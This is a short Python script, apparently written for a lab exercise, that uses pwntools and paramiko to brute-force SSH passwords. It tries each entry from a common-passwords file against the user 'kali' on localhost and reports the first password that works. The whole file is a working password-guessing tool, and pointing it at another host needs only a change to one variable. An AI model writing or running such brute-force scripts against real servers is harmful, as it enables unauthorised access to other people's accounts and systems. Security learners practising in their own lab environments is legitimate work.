#!/bin/python3

from pwn import *
import paramiko

host = "127.0.0.1"
username = "kali"
attempts = 0

with open("commonPasswords.txt", "r") as file:
    for pwd in file:
        pwd = pwd.strip()
        print("[{}] Attempting password: {}".format(attempts, pwd))
        
        try:
            login = ssh(host=host, user=username, password=pwd, timeout=3)
            
            if login.connected():
                print(">> Valid password found: {}".format(pwd))
                login.close()
                break
            login.close()
        
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password")
        
        except paramiko.ssh_exception.NoValidConnectionsError:
            print("[!] Unable to connect to the SSH service. Check if SSH is running and accessible on port 22.")
            break
            
        attempts += 1
